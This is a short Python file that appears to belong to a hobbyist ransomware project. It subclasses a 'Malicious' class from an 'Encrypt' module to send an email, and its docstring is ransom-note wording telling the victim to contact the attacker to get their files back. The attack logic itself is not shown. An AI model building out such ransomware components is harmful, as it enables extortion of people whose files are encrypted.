from Encrypt import Malicious

# This is used for Messaging your Day Boss
"""
Run This File To communicate With Your Boss if You Want Your Files
"""


class Send_email(Malicious):
    def __init__(self):
        super().__init__()


def main():

    send = Send_email()

    send.send_mail()


if __name__ == "__main__":
    main()
